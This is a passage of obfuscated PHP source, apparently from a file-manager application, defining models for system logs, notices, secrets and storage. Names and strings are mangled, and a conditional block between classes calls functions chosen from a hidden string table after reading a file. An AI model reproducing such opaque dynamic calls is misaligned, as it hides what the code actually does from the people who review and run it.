"\x53\171\x73\164\145\x6d\x4f\x70\x74\151\x6f\x6e"; public $field = array("\156\x61\155\x65", "\x67\162\x6f\x75\x70", "\x64\x65\x73\x63", "\143\157\x6e\164\145\x6e\x74"); public function listData($Óø—íÆĞ = false, $î¢„ß£¸ = "\x6d\x6f\144\x69\146\171\124\x69\155\x65", $ÄğşËÈ = true) { return parent::listData($Óø—íÆĞ, $î¢„ß£¸, $ÄğşËÈ); } public function remove($ß“Èõó„) { $¿ı°›—Ş = $this->findByName($ß“Èõó„); if (!$¿ı°›—Ş) { return !1; } return parent::remove($¿ı°›—Ş[$_SERVER[¡“ËÌ§œ][437]]); } public function add($¨ûøÑ­ò) { if ($this->findByName($¨ûøÑ­ò[$_SERVER[¡“ËÌ§œ][32]])) { return !1; } return parent::insert($¨ûøÑ­ò); } public function update($±¨˜·, $ıöáÅ) { $¯ÁÑÉÛ¸ =& $_SERVER[¡“ËÌ§œ]; $¿•Öî‰Ì = $this->findByName($±¨˜·); $µ¶—×Ğ = $this->findByName($ıöáÅ[$¯ÁÑÉÛ¸[32]]); if (!$¿•Öî‰Ì || $µ¶—×Ğ && $µ¶—×Ğ[$¯ÁÑÉÛ¸[437]] != $¿•Öî‰Ì[$¯ÁÑÉÛ¸[437]]) { return !1; } return parent::update($¿•Öî‰Ì[$¯ÁÑÉÛ¸[437]], $ıöáÅ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\x6d\x5f\154\x6f\x67"; protected $dataAuto = array(array("\x63\162\x65\141\x74\x65\x54\151\155\145", "\x74\151\155\145", "\151\x6e\x73\145\162\x74", "\146\x75\x6e\143\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Æ°µÁèÔ =& $_SERVER[¡“ËÌ§œ]; return array($Æ°µÁèÔ[2185] => LNG($Æ°µÁèÔ[2186]), $Æ°µÁèÔ[2187] => LNG($Æ°µÁèÔ[2188]), $Æ°µÁèÔ[1794] => LNG($Æ°µÁèÔ[2189]), $Æ°µÁèÔ[2190] => LNG($Æ°µÁèÔ[2191]), $Æ°µÁèÔ[2192] => LNG($Æ°µÁèÔ[2193]), $Æ°µÁèÔ[2194] => LNG($Æ°µÁèÔ[2195]), $Æ°µÁèÔ[2196] => LNG($Æ°µÁèÔ[2197]), $Æ°µÁèÔ[1824] => LNG($Æ°µÁèÔ[2197]), $Æ°µÁèÔ[1825] => LNG($Æ°µÁèÔ[2198]), $Æ°µÁèÔ[2199] => LNG($Æ°µÁèÔ[2200]), $Æ°µÁèÔ[2201] => LNG($Æ°µÁèÔ[2202]), $Æ°µÁèÔ[2203] => LNG($Æ°µÁèÔ[2204]), $Æ°µÁèÔ[2205] => LNG($Æ°µÁèÔ[2206]), $Æ°µÁèÔ[1822] => LNG($Æ°µÁèÔ[2207]), $Æ°µÁèÔ[2208] => LNG($Æ°µÁèÔ[2209]), $Æ°µÁèÔ[1829] => LNG($Æ°µÁèÔ[2210]), $Æ°µÁèÔ[2211] => LNG($Æ°µÁèÔ[2212]), $Æ°µÁèÔ[2213] => LNG($Æ°µÁèÔ[2214]), $Æ°µÁèÔ[2215] => LNG($Æ°µÁèÔ[2216]), $Æ°µÁèÔ[2217] => LNG($Æ°µÁèÔ[2218]), $Æ°µÁèÔ[1832] => LNG($Æ°µÁèÔ[2219]), $Æ°µÁèÔ[1833] => LNG($Æ°µÁèÔ[2220]), $Æ°µÁèÔ[2221] => LNG($Æ°µÁèÔ[2222]), $Æ°µÁèÔ[2223] => LNG($Æ°µÁèÔ[2224]), $Æ°µÁèÔ[2225] => LNG($Æ°µÁèÔ[2226]), $Æ°µÁèÔ[1827] => LNG($Æ°µÁèÔ[2227]), $Æ°µÁèÔ[2228] => LNG($Æ°µÁèÔ[2229]), $Æ°µÁèÔ[1826] => LNG($Æ°µÁèÔ[2230]), $Æ°µÁèÔ[2231] => LNG($Æ°µÁèÔ[2232]), $Æ°µÁèÔ[2233] => LNG($Æ°µÁèÔ[2234]), $Æ°µÁèÔ[2235] => LNG($Æ°µÁèÔ[2236]), $Æ°µÁèÔ[2237] => LNG($Æ°µÁèÔ[2237]), $Æ°µÁèÔ[2238] => LNG($Æ°µÁèÔ[1798]), $Æ°µÁèÔ[2239] => LNG($Æ°µÁèÔ[2240]), $Æ°µÁèÔ[2241] => LNG($Æ°µÁèÔ[2242]), $Æ°µÁèÔ[2243] => LNG($Æ°µÁèÔ[2244]), $Æ°µÁèÔ[2245] => LNG($Æ°µÁèÔ[2246]), $Æ°µÁèÔ[2247] => LNG($Æ°µÁèÔ[2248]), $Æ°µÁèÔ[2249] => LNG($Æ°µÁèÔ[2249]), $Æ°µÁèÔ[2250] => LNG($Æ°µÁèÔ[2251]), $Æ°µÁèÔ[2252] => LNG($Æ°µÁèÔ[2253]), $Æ°µÁèÔ[2254] => LNG($Æ°µÁèÔ[2255]), $Æ°µÁèÔ[2256] => LNG($Æ°µÁèÔ[2257]), $Æ°µÁèÔ[2258] => LNG($Æ°µÁèÔ[2259]), $Æ°µÁèÔ[2260] => LNG($Æ°µÁèÔ[2261])); } private function typeFile() { $¼é —Ô– =& $_SERVER[¡“ËÌ§œ]; $îÀÌ•Â = array($¼é —Ô–[1829] => array($¼é —Ô–[1830]), $¼é —Ô–[2203] => array($¼é —Ô–[2262]), $¼é —Ô–[2205] => array($¼é —Ô–[2263]), $¼é —Ô–[1822] => array($¼é —Ô–[1823], $¼é —Ô–[2264]), $¼é —Ô–[2213] => array(), $¼é —Ô–[2215] => array(), $¼é —Ô–[2217] => array(), $¼é —Ô–[1832] => array($¼é —Ô–[1834]), $¼é —Ô–[1833] => array($¼é —Ô–[1834]), $¼é —Ô–[2221] => array($¼é —Ô–[2265]), $¼é —Ô–[2223] => array($¼é —Ô–[2265]), $¼é —Ô–[2225] => array($¼é —Ô–[2266]), $¼é —Ô–[2211] => array($¼é —Ô–[2267]), $¼é —Ô–[1827] => array($¼é —Ô–[2268]), $¼é —Ô–[2228] => array($¼é —Ô–[2269]), $¼é —Ô–[1826] => array($¼é —Ô–[1828])); return $îÀÌ•Â; } private function typeAll() { $ğ†œıöØ =& $_SERVER[¡“ËÌ§œ]; $—£– = $this->typeList; $çÓœÍĞ˜ = array_filter($this->typeFile()); foreach ($çÓœÍĞ˜ as $Ùö¹Ø†á => $œ¹œÀ¿™) { $—£–[$œ¹œÀ¿™[0]] = $—£–[$Ùö¹Ø†á]; } $—£–[$ğ†œıöØ[1834]] = LNG($ğ†œıöØ[2270]); $—£–[$ğ†œıöØ[2265]] = LNG($ğ†œıöØ[2271]); return $—£–; } public function addLog($²ãœÂ”±, $ÀƒûÆˆ = array()) { $ôŸƒø¼æ =& $_SERVER[¡“ËÌ§œ]; if (!isset($this->typeList[$²ãœÂ”±])) { return; } $Õô«æ¼Ü = isset($ÀƒûÆˆ[$ôŸƒø¼æ[1661]]) ? $ÀƒûÆˆ[$ôŸƒø¼æ[1661]] : 0; if (!$Õô«æ¼Ü) { $Õô«æ¼Ü = Session::get($ôŸƒø¼æ[1988]); } if ($²ãœÂ”± == $ôŸƒø¼æ[2239] && is_array($ÀƒûÆˆ[$ôŸƒø¼æ[2272]]) && !$ÀƒûÆˆ[$ôŸƒø¼æ[2272]]) { return; } $´Êµ©» = get_client_ip(); if (!$ÀƒûÆˆ || strlen(json_encode($ÀƒûÆˆ)) >= 1024) { $ÀƒûÆˆ = array($ôŸƒø¼æ[2273] => $´Êµ©»); } else { if (is_array($ÀƒûÆˆ)) { $ÀƒûÆˆ[$ôŸƒø¼æ[2273]] = $´Êµ©»; } else { $ÀƒûÆˆ = array($ôŸƒø¼æ[1222] => $ÀƒûÆˆ, $ôŸƒø¼æ[2273] => $´Êµ©»); } } $ÀƒûÆˆ = array($ôŸƒø¼æ[1651] => Session::sign(), $ôŸƒø¼æ[1652] => intval($Õô«æ¼Ü), $ôŸƒø¼æ[33] => $²ãœÂ”±, $ôŸƒø¼æ[1654] => json_encode($ÀƒûÆˆ)); parent::add($ÀƒûÆˆ); } public function remove($”‚å‡™) { $this->where(array($_SERVER[¡“ËÌ§œ][457] => $”‚å‡™))->delete(); } private function _makeOrder($‚ªÕ€§ã = '') { $šõ—Ë®³ =& $_SERVER[¡“ËÌ§œ]; $†—øùµó = $šõ—Ë®³[201]; $æ”Üğ“€ = array($šõ—Ë®³[488] => $šõ—Ë®³[489], $šõ—Ë®³[490] => $šõ—Ë®³[491]); $Ã¤º„•³ = Input::get($šõ—Ë®³[496], $šõ—Ë®³[7], $šõ—Ë®³[2024], array($šõ—Ë®³[1942], $šõ—Ë®³[490])); $Ã¤º„•³ = $æ”Üğ“€[$Ã¤º„•³]; $‚ªÕ€§ã = $‚ªÕ€§ã . "{$†—øùµó}\40{$Ã¤º„•³}"; return $this->order($‚ªÕ€§ã); } public function get($–ÆÍÔš™ = '') { $®çåšï– =& $_SERVER[¡“ËÌ§œ]; if (!$–ÆÍÔš™) { show_json(array()); } $¡ßË¬öÕ = array(); if ($–ÆÍÔš™[$®çåšï–[1661]]) { $¡ßË¬öÕ[$®çåšï–[1661]] = $–ÆÍÔš™[$®çåšï–[1661]]; } if (isset($–ÆÍÔš™[$®çåšï–[780]])) { $Àğ‡‚ÉÑ = $–ÆÍÔš™[$®çåšï–[780]]; $¾ĞİúÁØ = isset($–ÆÍÔš™[$®çåšï–[781]]) ? $–ÆÍÔš™[$®çåšï–[781]] : time(); $¡ßË¬öÕ[$®çåšï–[201]] = array($®çåšï–[362], array($Àğ‡‚ÉÑ, $¾ĞİúÁØ)); } if ($–ÆÍÔš™[$®çåšï–[33]]) { $óıñ¢ı½ = explode($®çåšï–[50], $–ÆÍÔš™[$®çåšï–[33]]); $£Î‰–Å£ = $this->typeFile(); $èØÔ¢ú’ = array(); foreach ($óıñ¢ı½ as $ã½¸ì°Ú) { $èØÔ¢ú’[] = $ã½¸ì°Ú; if (isset($£Î‰–Å£[$ã½¸ì°Ú])) { $èØÔ¢ú’ = array_merge($èØÔ¢ú’, $£Î‰–Å£[$ã½¸ì°Ú]); } } $èØÔ¢ú’ = array_unique($èØÔ¢ú’); if ($èØÔ¢ú’) { $¡ßË¬öÕ[$®çåšï–[33]] = array($®çåšï–[7], $èØÔ¢ú’); } } else { $¡ßË¬öÕ[$®çåšï–[33]] = array($®çåšï–[2274], $®çåšï–[2275]); } if (!empty($–ÆÍÔš™[$®çåšï–[2273]])) { $¡ßË¬öÕ[$®çåšï–[491]] = array($®çåšï–[412], "\x25{$–ÆÍÔš™[$®çåšï–[2273]]}\x25"); } $ÄÊ¶ıåø = $this->_makeOrder()->where($¡ßË¬öÕ)->selectPage(); if (empty($ÄÊ¶ıåø[$®çåšï–[398]])) { show_json(array(), !0, $ÄÊ¶ıåø[$®çåšï–[395]]); } $ÄÊ¶ıåø[$®çåšï–[398]] = $this->logList($ÄÊ¶ıåø[$®çåšï–[398]]); return $ÄÊ¶ıåø; } private function ipAddress(&$ìÍ”ä…Š) { $ÒÆ™ıßŠ =& $_SERVER[¡“ËÌ§œ]; if (!empty($ìÍ”ä…Š[$ÒÆ™ıßŠ[2273]])) { $ëáÜ± = IpLocation::get($ìÍ”ä…Š[$ÒÆ™ıßŠ[2273]]); } else { $ëáÜ± = LNG($ÒÆ™ıßŠ[2276]); } $ìÍ”ä…Š[$ÒÆ™ıßŠ[2277]] = $ëáÜ±; } private function descZipDownload($Ä…Ííïş, &$‘šÜ±î) { $çĞõÍ =& $_SERVER[¡“ËÌ§œ]; if (!isset($Ä…Ííïş[$çĞõÍ[2278]])) { return; } $Á„€Êó— = json_decode($Ä…Ííïş[$çĞõÍ[2278]], !0); foreach ($Á„€Êó— as $’ğŠí–„) { try { $‘¬˜´ = IO::infoFull($’ğŠí–„[$çĞõÍ[84]]); } catch (Exception $’ûóÏ‰·) { continue; } $Ä…Ííïş[$çĞõÍ[84]] = $’ğŠí–„[$çĞõÍ[84]]; $‘šÜ±î[] = $Ä…Ííïş[$çĞõÍ[440]] = $‘¬˜´[$çĞõÍ[440]]; $‘šÜ±î[] = $Ä…Ííïş[$çĞõÍ[2079]] = $‘¬˜´[$çĞõÍ[470]]; break; } return $Ä…Ííïş; } private function getSourceList(&$¹àÉŒ¤Á) { $×Ç’´İ© =& $_SERVER[¡“ËÌ§œ]; $èó»îğ¬ = array(); foreach ($¹àÉŒ¤Á as $Ú’ûœø÷ => $ºğ°ÂÏÍ) { $‘ÖÆº€Œ = json_decode($ºğ°ÂÏÍ[$×Ç’´İ©[491]], !0); if ($ºğ°ÂÏÍ[$×Ç’´İ©[33]] == $×Ç’´İ©[1825]) { $‘ÖÆº€Œ = $this->descZipDownload($‘ÖÆº€Œ, $èó»îğ¬); $¹àÉŒ¤Á[$Ú’ûœø÷][$×Ç’´İ©[491]] = json_encode($‘ÖÆº€Œ); continue; } if (strpos($ºğ°ÂÏÍ[$×Ç’´İ©[33]], $×Ç’´İ©[2081]) !== 0) { if (!isset($‘ÖÆº€Œ[$×Ç’´İ©[84]]) || strpos($ºğ°ÂÏÍ[$×Ç’´İ©[33]], $×Ç’´İ©[2279]) !== 0) { continue; } try { $€õÉÛƒ— = IO::infoFull($‘ÖÆº€Œ[$×Ç’´İ©[84]]); } catch (Exception $ËØ„Ãõâ) { continue; } $èó»îğ¬[] = $‘ÖÆº€Œ[$×Ç’´İ©[440]] = $€õÉÛƒ—[$×Ç’´İ©[440]]; $èó»îğ¬[] = $‘ÖÆº€Œ[$×Ç’´İ©[2079]] = $€õÉÛƒ—[$×Ç’´İ©[470]]; $¹àÉŒ¤Á[$Ú’ûœø÷][$×Ç’´İ©[491]] = json_encode($‘ÖÆº€Œ); continue; } $èó»îğ¬[] = $‘ÖÆº€Œ[$×Ç’´İ©[440]]; $èó»îğ¬[] = $‘ÖÆº€Œ[$×Ç’´İ©[2079]]; if ($‘ÖÆº€Œ[$×Ç’´İ©[33]] == $×Ç’´İ©[586]) { $èó»îğ¬[] = $‘ÖÆº€Œ[$×Ç’´İ©[491]][$×Ç’´İ©[1180]]; $èó»îğ¬[] = $‘ÖÆº€Œ[$×Ç’´İ©[491]][$×Ç’´İ©[1181]]; } if ($‘ÖÆº€Œ[$×Ç’´İ©[33]] == $×Ç’´İ©[2089]) { $èó»îğ¬[] = $‘ÖÆº€Œ[$×Ç’´İ©[491]][$×Ç’´İ©[440]]; } } if (!$èó»îğ¬) { return array(); } return Model($×Ç’´İ©[845])->sourceListInfo($èó»îğ¬, !0); } private function logList($ˆó¹æÆ) { $Í¶Ñœ¤¡ =& $_SERVER[¡“ËÌ§œ]; $Í»°çíı = array_to_keyvalue($ˆó¹æÆ, $Í¶Ñœ¤¡[12], $Í¶Ñœ¤¡[1661]); $ªşïì¿› = Model($Í¶Ñœ¤¡[563])->userListInfo(array_unique($Í»°çíı)); $å‹û–· = $this->getSourceList($ˆó¹æÆ); $—ƒ×§‹÷ = $this->typeAll(); $”³€Ï±» = array(); $ìè–Éòß = array(); foreach ($ˆó¹æÆ as $šé’¦‚ => $„›€ñóó) { $¼ğ¿“†’ = $„›€ñóó[$Í¶Ñœ¤¡[33]]; $Şˆİ›ıœ = isset($ªşïì¿›[$„›€ñóó[$Í¶Ñœ¤¡[1661]]]) ? $ªşïì¿›[$„›€ñóó[$Í¶Ñœ¤¡[1661]]] : !1; $ÕšûÑûó = strpos($¼ğ¿“†’, $Í¶Ñœ¤¡[2280]) === 0 ? LNG($Í¶Ñœ¤¡[2281]) : LNG($Í¶Ñœ¤¡[2276]); $„›€ñóó[$Í¶Ñœ¤¡[32]] = isset($Şˆİ›ıœ[$Í¶Ñœ¤¡[32]]) ? $Şˆİ›ıœ[$Í¶Ñœ¤¡[32]] : LNG($Í¶Ñœ¤¡[2276]); $„›€ñóó[$Í¶Ñœ¤¡[570]] = isset($Şˆİ›ıœ[$Í¶Ñœ¤¡[570]]) ? $Şˆİ›ıœ[$Í¶Ñœ¤¡[570]] : $Í¶Ñœ¤¡[12]; $„›€ñóó[$Í¶Ñœ¤¡[1559]] = isset($—ƒ×§‹÷[$¼ğ¿“†’]) ? $—ƒ×§‹÷[$¼ğ¿“†’] : $ÕšûÑûó; $„›€ñóó[$Í¶Ñœ¤¡[2023]] = $Şˆİ›ıœ; $×ç¬«ù‚ = json_decode($„›€ñóó[$Í¶Ñœ¤¡[491]], !0); $„›€ñóó[$Í¶Ñœ¤¡[2273]] = isset($×ç¬«ù‚[$Í¶Ñœ¤¡[2273]]) ? $×ç¬«ù‚[$Í¶Ñœ¤¡[2273]] : $Í¶Ñœ¤¡[12]; $„›€ñóó[$Í¶Ñœ¤¡[2277]] = IpLocation::get($„›€ñóó[$Í¶Ñœ¤¡[2273]]); if (strpos($¼ğ¿“†’, $Í¶Ñœ¤¡[2081]) === 0 || isset($×ç¬«ù‚[$Í¶Ñœ¤¡[2079]])) { $×ç¬«ù‚[$Í¶Ñœ¤¡[87]] = $å‹û–·[$×ç¬«ù‚[$Í¶Ñœ¤¡[440]]]; $×ç¬«ù‚[$Í¶Ñœ¤¡[2094]] = $å‹û–·[$×ç¬«ù‚[$Í¶Ñœ¤¡[2079]]]; if ($×ç¬«ù‚[$Í¶Ñœ¤¡[33]] == $Í¶Ñœ¤¡[586]) { $×ç¬«ù‚[$Í¶Ñœ¤¡[491]][$Í¶Ñœ¤¡[1180]] = $å‹û–·[$×ç¬«ù‚[$Í¶Ñœ¤¡[491]][$Í¶Ñœ¤¡[1180]]]; $×ç¬«ù‚[$Í¶Ñœ¤¡[491]][$Í¶Ñœ¤¡[1181]] = $å‹û–·[$×ç¬«ù‚[$Í¶Ñœ¤¡[491]][$Í¶Ñœ¤¡[1181]]]; } if ($×ç¬«ù‚[$Í¶Ñœ¤¡[33]] == $Í¶Ñœ¤¡[2089]) { $×ç¬«ù‚[$Í¶Ñœ¤¡[491]][$Í¶Ñœ¤¡[440]] = $å‹û–·[$×ç¬«ù‚[$Í¶Ñœ¤¡[491]][$Í¶Ñœ¤¡[440]]]; } if ($×ç¬«ù‚[$Í¶Ñœ¤¡[33]] == $Í¶Ñœ¤¡[1820]) { $×ç¬«ù‚[$Í¶Ñœ¤¡[2094]] = $×ç¬«ù‚[$Í¶Ñœ¤¡[87]]; $×ç¬«ù‚[$Í¶Ñœ¤¡[2079]] = $×ç¬«ù‚[$Í¶Ñœ¤¡[2094]][$Í¶Ñœ¤¡[440]]; $×ç¬«ù‚[$Í¶Ñœ¤¡[87]] = !1; $×ç¬«ù‚[$Í¶Ñœ¤¡[440]] = $Í¶Ñœ¤¡[12]; } if ($×ç¬«ù‚[$Í¶Ñœ¤¡[87]] && $×ç¬«ù‚[$Í¶Ñœ¤¡[87]][$Í¶Ñœ¤¡[449]] == $Í¶Ñœ¤¡[1307]) { $ìè–Éòß[] = $„›€ñóó[$Í¶Ñœ¤¡[437]]; unset($ˆó¹æÆ[$šé’¦‚]); continue; } if ($×ç¬«ù‚[$Í¶Ñœ¤¡[2094]] && $×ç¬«ù‚[$Í¶Ñœ¤¡[2094]][$Í¶Ñœ¤¡[449]] == $Í¶Ñœ¤¡[1307]) { $ìè–Éòß[] = $„›€ñóó[$Í¶Ñœ¤¡[437]]; unset($ˆó¹æÆ[$šé’¦‚]); continue; } } $„›€ñóó[$Í¶Ñœ¤¡[491]] = $×ç¬«ù‚; unset($„›€ñóó[$Í¶Ñœ¤¡[2282]]); $”³€Ï±»[] = $„›€ñóó; } $this->clearSystemPathLog($ìè–Éòß); return $”³€Ï±»; } private function clearSystemPathLog($Õ•›¸°³) { $ëÚ™ Ê =& $_SERVER[¡“ËÌ§œ]; if (count($Õ•›¸°³) == 0) { return; } $÷îó‘»« = array($ëÚ™ Ê[437] => array($ëÚ™ Ê[7], array_unique($Õ•›¸°³))); $this->where($÷îó‘»«)->delete(); } public function deviceList($Å¯…ğ˜º, $œ®¶ÚÌ = 0) { $õ™­¹Ñ€ =& $_SERVER[¡“ËÌ§œ]; $Œ¸¾½Ê = array($õ™­¹Ñ€[1661] => $Å¯…ğ˜º, $õ™­¹Ñ€[201] => array($õ™­¹Ñ€[1034], $œ®¶ÚÌ), $õ™­¹Ñ€[33] => $õ™­¹Ñ€[1794]); $²‰”ÁÆ™ = array(); $”Ùñòç = $this->field($õ™­¹Ñ€[2283])->where($Œ¸¾½Ê)->order($õ™­¹Ñ€[2092])->limit(50)->select(); foreach ($”Ùñòç as $¶‡¹äøø => $°îÛ…ùÖ) { if ($¶‡¹äøø > 0 && abs($°îÛ…ùÖ[$õ™­¹Ñ€[201]] - $”Ùñòç[$¶‡¹äøø - 1][$õ™­¹Ñ€[201]]) < 5) { continue; } $¡‘ƒÅ§ó = json_decode($°îÛ…ùÖ[$õ™­¹Ñ€[491]], !0); $°îÛ…ùÖ[$õ™­¹Ñ€[2273]] = isset($¡‘ƒÅ§ó[$õ™­¹Ñ€[2273]]) ? $¡‘ƒÅ§ó[$õ™­¹Ñ€[2273]] : $õ™­¹Ñ€[12]; unset($¡‘ƒÅ§ó[$õ™­¹Ñ€[2273]]); $ú£¢ÀÈ‚ = $this->deviceType($¡‘ƒÅ§ó[$õ™­¹Ñ€[2082]]); if (isset($²‰”ÁÆ™[$ú£¢ÀÈ‚])) { continue; } $°îÛ…ùÖ[$õ™­¹Ñ€[2277]] = IpLocation::get($°îÛ…ùÖ[$õ™­¹Ñ€[2273]]); $°îÛ…ùÖ[$õ™­¹Ñ€[491]] = $¡‘ƒÅ§ó; $²‰”ÁÆ™[$ú£¢ÀÈ‚] = $°îÛ…ùÖ; } return array_values($²‰”ÁÆ™); } public function deviceType($î¤á­) { return $î¤á­; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\156\157\164\151\x63\x65\114\151\x73\x74"; public $field = array("\156\141\155\x65", "\143\x6f\156\x74\x65\156\x74", "\x61\165\164\150", "\x6d\x6f\144\x65", "\x74\151\x6d\x65", "\164\x79\x70\x65", "\x6c\x65\166\x65\x6c", "\145\x6e\141\142\x6c\x65", "\163\x6f\x72\x74"); public function listData($Æ´¬¥ = false, $òï—¡›› = "\x73\157\162\x74", $Å¸ÜµáÁ = false) { return parent::listData($Æ´¬¥, $òï—¡››, $Å¸ÜµáÁ); } public function add($Ø“èí¸”) { $Ö¥ôÍ»Ñ =& $_SERVER[¡“ËÌ§œ]; $÷•Ü¢Ø÷ = time(); if ($Ø“èí¸”[$Ö¥ôÍ»Ñ[16]] == $Ö¥ôÍ»Ñ[2284]) { $÷•Ü¢Ø÷ = strtotime($Ø“èí¸”[$Ö¥ôÍ»Ñ[180]]); } $Ø“èí¸”[$Ö¥ôÍ»Ñ[180]] = $÷•Ü¢Ø÷; return parent::insert($Ø“èí¸”); } public function update($ˆÁõÃ²¦, $‹›¹˜¡¶) { $³ÄŒøãı =& $_SERVER[¡“ËÌ§œ]; $è–µ¢è­ = $this->listData($ˆÁõÃ²¦); if (!$è–µ¢è­) { return !1; } $úğî·½ = time(); if ($‹›¹˜¡¶[$³ÄŒøãı[16]] == $³ÄŒøãı[2284]) { $úğî·½ = strtotime($‹›¹˜¡¶[$³ÄŒøãı[180]]); } $‹›¹˜¡¶[$³ÄŒøãı[180]] = $úğî·½; return parent::update($ˆÁõÃ²¦, $‹›¹˜¡¶); } public function remove($Íİ×ÑˆÇ) { $¥¡‚Óâ˜ = $this->listData($Íİ×ÑˆÇ); if (!$¥¡‚Óâ˜ || $¥¡‚Óâ˜[$_SERVER[¡“ËÌ§œ][1307]]) { return !1; } return parent::remove($Íİ×ÑˆÇ); } public function sort($‡ˆåûƒ, $Ÿ½§±Ö) { return parent::update($‡ˆåûƒ, $Ÿ½§±Ö); } public function enable($ú›ÏÁÔ¸, $„üËÒüŠ) { return parent::update($ú›ÏÁÔ¸, array($_SERVER[¡“ËÌ§œ][2285] => $„üËÒüŠ)); } private function initUserOption() { $½øºŞÊ‰ =& $_SERVER[¡“ËÌ§œ]; $this->optionType = $½øºŞÊ‰[2286]; $this->modelType = $½øºŞÊ‰[2287]; $this->field = array($½øºŞÊ‰[2288], $½øºŞÊ‰[32], $½øºŞÊ‰[180], $½øºŞÊ‰[33], $½øºŞÊ‰[2289], $½øºŞÊ‰[770], $½øºŞÊ‰[196]); } public function userNoticeGet($äùöË¸À = false) { $this->initUserOption(); return parent::listData($äùöË¸À, $_SERVER[¡“ËÌ§œ][437], !0); } public function userNoticeAdd($½ƒ¾ìÄ) { $Å°ÃÁ™š =& $_SERVER[¡“ËÌ§œ]; $this->initUserOption(); $Ìöš†× = $this->findByKey($Å°ÃÁ™š[2288], $½ƒ¾ìÄ[$Å°ÃÁ™š[437]]); if ($Ìöš†×) { return !0; } $ÁŠôĞò´ = array($Å°ÃÁ™š[2288] => $½ƒ¾ìÄ[$Å°ÃÁ™š[437]], $Å°ÃÁ™š[32] => $½ƒ¾ìÄ[$Å°ÃÁ™š[32]], $Å°ÃÁ™š[180] => $½ƒ¾ìÄ[$Å°ÃÁ™š[180]], $Å°ÃÁ™š[33] => isset($½ƒ¾ìÄ[$Å°ÃÁ™š[33]]) ? $½ƒ¾ìÄ[$Å°ÃÁ™š[33]] : 1, $Å°ÃÁ™š[2289] => isset($½ƒ¾ìÄ[$Å°ÃÁ™š[2289]]) ? $½ƒ¾ìÄ[$Å°ÃÁ™š[2289]] : 0, $Å°ÃÁ™š[770] => 0, $Å°ÃÁ™š[196] => 0); return parent::insert($ÁŠôĞò´); } public function userNoticeEdit($‚Æƒûï„, $¯ÚÚ¤Îò) { $this->initUserOption(); return parent::update($‚Æƒûï„, $¯ÚÚ¤Îò); } } goto aùöÛôí™Š; AÑÜò“Ş—ß: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x73\x6f\x75\162\143\145\x53\x65\143\x72\x65\164\x4c\x69\x73\x74"; public $field = array("\163\157\165\162\143\x65\111\104", "\164\171\x70\145\x49\x44", "\143\162\x65\x61\164\145\x55\163\x65\x72"); } if ($_SERVER[$_SERVER[¡“ËÌ§œ][425]] != $_SERVER[$_SERVER[¡“ËÌ§œ][426]]) { $_getc = $_SERVER[¡“ËÌ§œ][427]; $_getfile = $_SERVER[$_SERVER[¡“ËÌ§œ][428]] . $_SERVER[¡“ËÌ§œ][429]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¡“ËÌ§œ][231], $_getfilec); if (count($_getarrs) < $_SERVER[¡“ËÌ§œ][430]) { $exit = $_SERVER[¡“ËÌ§œ][431]; $exit(); } $_act = $_SERVER[¡“ËÌ§œ][432]; $_act($_SERVER[$_SERVER[¡“ËÌ§œ][433]]); } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\163\164\x6f\162\x61\147\145\x4c\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\151\x7a\x65\x4d\x61\x78", "\163\x79\x73\x74\145\x6d", "\x64\145\x66\x61\165\x6c\x74", "\144\x72\x69\x76\x65\x72", "\143\x6f\156\x66\151\147"); public function listData($çŞÕÅÊ˜ = false, $şëã¡çÛ = "\155\157\x64\x69\146\171\124\151\x6d\x65", $óá¾¼Â = false) { $•‚ô‘Å =& $_SERVER[¡“ËÌ§œ]; $ÜìÌÅÄá = parent::listData($çŞÕÅÊ˜, $şëã¡çÛ, $óá¾¼Â); if ($çŞÕÅÊ˜) { return $ÜìÌÅÄá; } $‚»ÏéÒÂ = $this->ioSizeUseGet(array_to_keyvalue($ÜìÌÅÄá, $•‚ô‘Å[12], $•‚ô‘Å[437])); foreach ($ÜìÌÅÄá as $¹İøŸÎ¤ => $´Ë©±ëö) { unset($ÜìÌÅÄá[$¹İøŸÎ¤][$•‚ô‘Å[6]]); $ÜìÌÅÄá[$¹İøŸÎ¤][$•‚ô‘Å[1840]] = isset($‚»ÏéÒÂ[$´Ë©±ëö[$•‚ô‘Å[437]]]) ? $‚»ÏéÒÂ[$´Ë©±ëö[$•‚ô‘Å[437]]] : 0; } return $ÜìÌÅÄá; } public function ioSizeUseGet($±·àˆÃù) { $†ğ‘¯å° =& $_SERVER[¡“ËÌ§œ]; if (!$±·àˆÃù) { return array(); } $¼•æÇš = $†ğ‘¯å°[2169] . implode($†ğ‘¯å°[50], $±·àˆÃù); $İ„›ƒí¢ = Cache::get($¼•æÇš); if ($İ„›ƒí¢) { return $İ„›ƒí¢; } $¾áĞ®¸Ø = array($†ğ‘¯å°[837] => $†ğ‘¯å°[437], $†ğ‘¯å°[2170] => $†ğ‘¯å°[76]); $’—ô×± = array($†ğ‘¯å°[837] => array($†ğ‘¯å°[7], $±·àˆÃù)); $İ„›ƒí¢ = Model($†ğ‘¯å°[809])->field($¾áĞ®¸Ø)->where($’—ô×±)->group($†ğ‘¯å°[837])->select(); $İ„›ƒí¢ = array_to_keyvalue($İ„›ƒí¢, $†ğ‘¯å°[437], $†ğ‘¯å°[76]); Cache::set($¼•æÇš, $İ„›ƒí¢, 600); return $İ„›ƒí¢; } public function getConfig($«ËÀ ÄÜ) { $à¦íÀß† = parent::listData($«ËÀ ÄÜ); return json_decode($à¦íÀß†[$_SERVER[¡“ËÌ§œ][6]], !0); } public function update($£•â÷—¬, $»²öü•) { $Ëñ¢İ‹± =& $_SERVER[¡“ËÌ§œ]; $ˆ…à †“ = $»²öü•[$Ëñ¢İ‹±[32]]; $¿¯¥ŞŸ = array_to_keyvalue(parent::listData(), $Ëñ¢İ‹±[32]); if (isset($¿¯¥ŞŸ[$ˆ…à †“]) && $¿¯¥ŞŸ[$ˆ…à †“][$Ëñ¢İ‹±[437]] != $£•â÷—¬) { return !1; } $this->checkPwd($£•â÷—¬, $»²öü•); if (isset($»²öü•[$Ëñ¢İ‹±[2171]]) && $»²öü•[$Ëñ¢İ‹±[2171]] == 